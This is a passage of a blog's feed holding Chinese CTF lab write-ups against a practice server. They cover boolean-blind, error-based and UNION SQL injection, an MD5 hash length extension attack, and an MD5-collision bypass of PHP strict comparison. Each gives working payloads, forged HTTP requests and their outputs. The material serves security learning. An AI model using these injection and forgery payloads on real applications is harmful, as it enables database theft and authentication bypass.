class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># database()</span></span><br><span class="line">    <span class="comment"># tables()</span></span><br><span class="line">    <span class="keyword">for</span> table_name <span class="keyword">in</span> tables():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;table_name&#125;</span>]&#x27;</span>)</span><br><span class="line">        result = dump(table_name, columns(table_name))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result.split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p>关于布尔盲注的学习可以参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/cra4uiymb46f2ahz">https://www.yuque.com/shiyizhesonder/sonder39/cra4uiymb46f2ahz</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;布尔盲注通过观察应用程序的响应来推断SQL查询的结果。在布尔盲注中，发送特定的SQL语句，这些语句的结果是一个布尔值（真或假）。然后，根据应</summary>
      
    
    
    
    <category term="sqli" scheme="http://example.com/categories/sqli/"/>
    
    
    <category term="布尔盲注" scheme="http://example.com/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>报错注入实验</title>
    <link href="http://example.com/2024/03/05/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2024/03/05/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</id>
    <published>2024-03-05T10:13:21.000Z</published>
    <updated>2024-10-23T01:34:29.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>报错注入利用了数据库错误信息来获取关于数据库结构的信息。当输入特定的SQL语句时，如果没有正确处理这些输入，可能会触发数据库错误，并将错误信息返回给用户。</p><p>例如，攻击者可能会尝试输入一个无效的SQL语句，如<code>&#39; OR &#39;x&#39;=&#39;x</code>。如果应用程序没有正确处理这个输入，可能会导致数据库执行如下的SQL语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;x&#x27;</span><span class="operator">=</span><span class="string">&#x27;x&#x27;</span></span><br></pre></td></tr></table></figure><p>由于<code>&#39;x&#39;=&#39;x&#39;</code>总是为真，这个查询将返回所有用户的信息。如果将数据库的错误信息直接返回给用户，攻击者就可以利用这些信息来了解数据库的结构，从而构造更有效的攻击。</p><p>报错注入的关键在于利用数据库的错误信息。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li><p>按提示输入 221101 ，得到</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32835/result.php?id=221101</span><br><span class="line"></span><br><span class="line">查询成功</span><br></pre></td></tr></table></figure></li></ol><p>​说明 id 是注入点， 且无回显，需要使用报错注入</p><ol start="2"><li><p>输入 221101 and 1&#x3D;1，判断注入类型，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32835/result.php?id=221103&#x27;</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;221101&#x27;&#x27;&#x27; at line 1</span><br><span class="line"></span><br><span class="line">http://ctf.seek2.top:32835/result.php?id=221101&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">查询成功</span><br></pre></td></tr></table></figure><p>说明是字符型注入</p></li><li><p>判断数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or extractvalue(1, concat(0x7e, database()))#</span><br><span class="line"></span><br><span class="line">查询失败</span><br><span class="line">XPATH syntax error: &#x27;~CSSEC&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>说明数据库名为 CSSEC</p><ol start="5"><li><p>判断数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br><span class="line"></span><br><span class="line">查询失败</span><br><span class="line">XPATH syntax error: &#x27;~error_injection,member,platform&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>找到目标数据表 error_injection</p><ol start="6"><li><p>判断列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;error_injection&#x27;)))#</span><br><span class="line"></span><br><span class="line">查询失败</span><br><span class="line">XPATH syntax error: &#x27;~flag&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>只有一个 flag 列</p><ol start="7"><li><p>得到数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or extractvalue(1, concat(0x7e, substr((select group_concat(flag) from error_injection),1,32)))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询失败</span><br><span class="line">XPATH syntax error: &#x27;~flag&#123;ffd44287-7723-4e88-9391-e1&#x27;</span><br><span class="line"></span><br><span class="line">-1&#x27; or extractvalue(1, concat(0x7e, substr((select group_concat(flag) from error_injection),32,32)))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询失败</span><br><span class="line">XPATH syntax error: &#x27;~72a2492d8f&#125;&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>关于报错注入的学习可以参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/tsfo1z6kvcwb6gfx">https://www.yuque.com/shiyizhesonder/sonder39/tsfo1z6kvcwb6gfx</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;报错注入利用了数据库错误信息来获取关于数据库结构的信息。当输入特定的SQL语句时，如果没有正确处理这些输入，可能会触发数据库错误，并将错误信</summary>
      
    
    
    
    <category term="sqli" scheme="http://example.com/categories/sqli/"/>
    
    
    <category term="报错注入" scheme="http://example.com/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>联合注入实验</title>
    <link href="http://example.com/2024/03/05/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2024/03/05/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</id>
    <published>2024-03-05T10:13:20.000Z</published>
    <updated>2024-10-23T01:27:23.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在SQL注入攻击中，联合注入利用了SQL的UNION操作符，将查询结果与原始查询结果合并，从而获取敏感信息。</p><p>在进行联合注入时，首先需要确定原始SQL查询返回的列数。这通常可以通过添加<code>ORDER BY</code>子句并逐渐增加列数来实现。当列数超过实际值时，数据库将返回错误。</p><p>一旦确定了列数，就可以构造UNION查询。这个查询需要包含与原始查询相同数量的列，并且每列的数据类型也需要匹配。通常会在这个查询中包含从其他表中获取的敏感信息，例如用户的用户名和密码。</p><p>例如，如果原始查询是</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id </span><br></pre></td></tr></table></figure><p>可以提交如下的$id：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> admin</span><br></pre></td></tr></table></figure><p>这将导致数据库执行如下的查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> admin</span><br></pre></td></tr></table></figure><p>这个查询将返回用户表中id为1的用户的用户名和密码，以及管理员表中所有用户的用户名和密码。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li><p>按提示输入 221103 ，得到</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32832/result.php?id=221103</span><br><span class="line"></span><br><span class="line">ID：221103</span><br><span class="line">Name：Sonder</span><br><span class="line">Advantage：flag in CSSEC.union_injection</span><br></pre></td></tr></table></figure></li></ol><p>​说明 id 是注入点， 且 flag 在数据库 CSSEC 的 union_injection 表中，</p><ol start="2"><li><p>输入 221103 and 1&#x3D;1，判断注入类型，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32832/result.php?id=221103 and 1=1</span><br><span class="line"></span><br><span class="line">ID：221103</span><br><span class="line">Name：Sonder</span><br><span class="line">Advantage：flag in CSSEC.union_injection</span><br></pre></td></tr></table></figure><p>说明是数字型注入</p></li><li><p>判断数据表列数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">221103 order by 2 查询成功</span><br><span class="line">221103 order by 3 查询成功</span><br><span class="line">221103 order by 4 查询成功</span><br><span class="line">221103 order by 5 Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>判断数据表列数为 4</p></li><li><p>判断数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,2,database(),4</span><br><span class="line"></span><br><span class="line">ID：1</span><br><span class="line">Name：2</span><br><span class="line">Advantage：CSSEC</span><br></pre></td></tr></table></figure><p>说明数据库名为 CSSEC</p></li><li><p>判断数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,2, group_concat(table_name),4 from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">ID：1</span><br><span class="line">Name：2</span><br><span class="line">Advantage：member,platform,union_injection,vulnerability</span><br></pre></td></tr></table></figure><p>找到目标数据表 union_injection</p></li><li><p>判断列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,2, group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&#x27;union_injection&#x27;</span><br><span class="line"></span><br><span class="line">ID：1</span><br><span class="line">Name：2</span><br><span class="line">Advantage：flag</span><br></pre></td></tr></table></figure><p>只有一个 flag 列</p></li><li><p>得到数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,2, group_concat(flag),4 from union_injection</span><br><span class="line"></span><br><span class="line">ID：1</span><br><span class="line">Name：2</span><br><span class="line">Advantage：flag&#123;4a909cf2-dc8e-47d6-a14d-10eaf6347da0&#125;</span><br></pre></td></tr></table></figure></li></ol><p>关于联合注入的学习可以参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/odx8gilog2lhkc6n">https://www.yuque.com/shiyizhesonder/sonder39/odx8gilog2lhkc6n</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;在SQL注入攻击中，联合注入利用了SQL的UNION操作符，将查询结果与原始查询结果合并，从而获取敏感信息。&lt;/p&gt;
&lt;p&gt;在进行联合注入时</summary>
      
    
    
    
    <category term="sqli" scheme="http://example.com/categories/sqli/"/>
    
    
    <category term="联合注入" scheme="http://example.com/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>哈希长度拓展攻击</title>
    <link href="http://example.com/2024/03/05/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2024/03/05/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2024-03-05T10:13:19.000Z</published>
    <updated>2024-10-23T01:32:17.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">getKey</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$sign</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;jwt&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sign</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span> . <span class="variable">$username</span> . <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>, <span class="string">&#x27;sec&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;数据似乎没有被恶意篡改，但服务器接收到的数据中不包含sec&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;检测到当前用户的数据被恶意篡改&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;看起来你并不是用户jwt&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;检测到sign为空, 可能需要刷新一下浏览器&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>有关哈希长度拓展攻击的原理可参考：</p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/zn5eggm5d2hr51dm">https://www.yuque.com/shiyizhesonder/sonder39/zn5eggm5d2hr51dm</a></p><p>拦截请求并更改为POST , 传入如下参数即可绕过，也可尝试其它绕过方法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ctf.seek2.top:32802</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sign=550fe9819127d62dcdef634c9a6b7453</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>145</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">username<span class="operator">=</span>jwt&amp;data<span class="operator">=</span>data<span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%C0</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>sec</span></span><br></pre></td></tr></table></figure><p>其中 payload 可以通过工具 hash-ext-attack 得到</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Sonder39@Sonder  /d/hash<span class="literal">-ext-attack</span> </span><br><span class="line"><span class="variable">$</span> python hash_ext_attack.py</span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">39</span>:<span class="number">19.106</span> | DEBUG    | common.md5_manual:__init__:<span class="number">17</span> - init......</span><br><span class="line">请输入已知明文：jwtdata</span><br><span class="line">请输入已知hash：<span class="number">5</span>a18d02b1f8da8d5f70a4cba720dfafd</span><br><span class="line">请输入扩展字符: sec</span><br><span class="line">请输入密钥长度：<span class="number">17</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">17.805</span> | INFO     | __main__:run:<span class="number">69</span> - 已知明文：b<span class="string">&#x27;jwtdata&#x27;</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">17.810</span> | INFO     | __main__:run:<span class="number">70</span> - 已知hash：b<span class="string">&#x27;5a18d02b1f8da8d5f70a4cba720dfafd&#x27;</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">17.816</span> | INFO     | __main__:run:<span class="number">72</span> - 新明文：b<span class="string">&#x27;jwtdata\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00sec&#x27;</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">17.822</span> | INFO     | __main__:run:<span class="number">73</span> - 新明文(url编码)：jwtdata%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%C0%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>sec</span><br><span class="line"><span class="number">2024</span><span class="literal">-03-05</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">17.828</span> | INFO     | __main__:run:<span class="number">75</span> - 新hash: <span class="number">550</span>fe9819127d62dcdef634c9a6b7453</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="哈希长度拓展攻击" scheme="http://example.com/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>字符型强比较漏洞</title>
    <link href="http://example.com/2024/03/05/%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/03/05/%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-05T10:13:18.000Z</published>
    <updated>2024-10-23T01:33:24.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;var1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;var2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;绕过PHP检测就可以得到FLAG&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>有关强比较&#x2F;弱比较漏洞的原理可参考：</p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae">https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae</a></p><p>拦截请求并更改为POST , 传入如下参数即可绕过，也可尝试其它绕过方法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ctf.seek2.top:32799</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">var<span class="number">1</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;var<span class="number">2</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="字符型强比较漏洞" scheme="http://example.com/tags/%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PHP强比较漏洞</title>
    <link href="http://example.com/2024/03/05/%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/03/05/%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-05T10:13:17.000Z</published>
    <updated>2024-10-23T01:33:25.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;var1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;var2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var1&#x27;</span>]) === <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span 